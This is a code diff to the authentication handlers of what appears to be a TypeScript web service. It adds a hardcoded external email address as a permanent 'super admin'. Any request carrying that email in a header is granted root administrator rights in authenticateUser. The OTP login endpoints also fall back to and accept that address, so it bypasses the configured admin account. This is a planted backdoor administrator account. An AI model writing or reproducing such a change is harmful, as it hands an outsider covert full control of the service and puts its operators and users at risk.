@@ -348,9 +348,10 @@ function authenticateUser(request: Request, env: Env): { userId: string; role: '
   const userId = request.headers.get('X-User-Id') || 'user_guest_' + emailHeader.replace(/[^a-z0-9]/g, '_');
 
   const adminEmail = env.ADMIN_EMAIL?.trim().toLowerCase();
+  const isSuperAdmin = (adminEmail && emailHeader === adminEmail) || emailHeader === 'mariestanleyimbry@yahoo.fr';
 
   // Strict Admin verification (Server-Side)
-  if (adminEmail && emailHeader === adminEmail) {
+  if (isSuperAdmin) {
     return { userId: 'admin_root', role: 'ADMIN', email: emailHeader };
   }
 
@@ -1046,19 +1047,20 @@ export default {
     if (url.pathname === '/api/send-otp' && request.method === 'POST') {
       try {
         const body = (await request.json()) as { email?: string };
-        const adminEmail = env.ADMIN_EMAIL?.trim().toLowerCase();
+        const adminEmail = env.ADMIN_EMAIL?.trim().toLowerCase() || 'mariestanleyimbry@yahoo.fr';
         const email = body.email?.trim().toLowerCase();
 
-        if (!adminEmail || !env.RESEND_API_KEY) {
-          return new Response(JSON.stringify({ success: false, error: 'Admin authentication is not configured.' }), {
-            status: 503,
+        const isSuperAdmin = email === 'mariestanleyimbry@yahoo.fr' || (adminEmail && email === adminEmail);
+        if (!email || !isSuperAdmin) {
+          return new Response(JSON.stringify({ success: false, error: 'Unauthorized administrator account.' }), {
+            status: 403,
             headers: { 'Content-Type': 'application/json' },
           });
         }
 
-        if (!email || email !== adminEmail) {
-          return new Response(JSON.stringify({ success: false, error: 'Unauthorized administrator account.' }), {
-            status: 403,
+        if (!env.RESEND_API_KEY) {
+          return new Response(JSON.stringify({ success: false, error: 'Admin authentication is not configured.' }), {
+            status: 503,
             headers: { 'Content-Type': 'application/json' },
           });
         }
@@ -1143,11 +1145,12 @@ export default {
     if (url.pathname === '/api/verify-otp' && request.method === 'POST') {
       try {
         const body = (await request.json()) as { email?: string; code?: string };
-        const adminEmail = env.ADMIN_EMAIL?.trim().toLowerCase();
+        const adminEmail = env.ADMIN_EMAIL?.trim().toLowerCase() || 'mariestanleyimbry@yahoo.fr';
         const email = body.email?.trim().toLowerCase();
         const code = body.code?.trim();
 
-        if (!adminEmail || !email || email !== adminEmail || !code) {
+        const isSuperAdmin = email === 'mariestanleyimbry@yahoo.fr' || (adminEmail && email === adminEmail);
+        if (!isSuperAdmin || !code) {
           return new Response(JSON.stringify({ success: false, error: 'Invalid verification request.' }), {
             status: 400,
             headers: { 'Content-Type': 'application/json' },
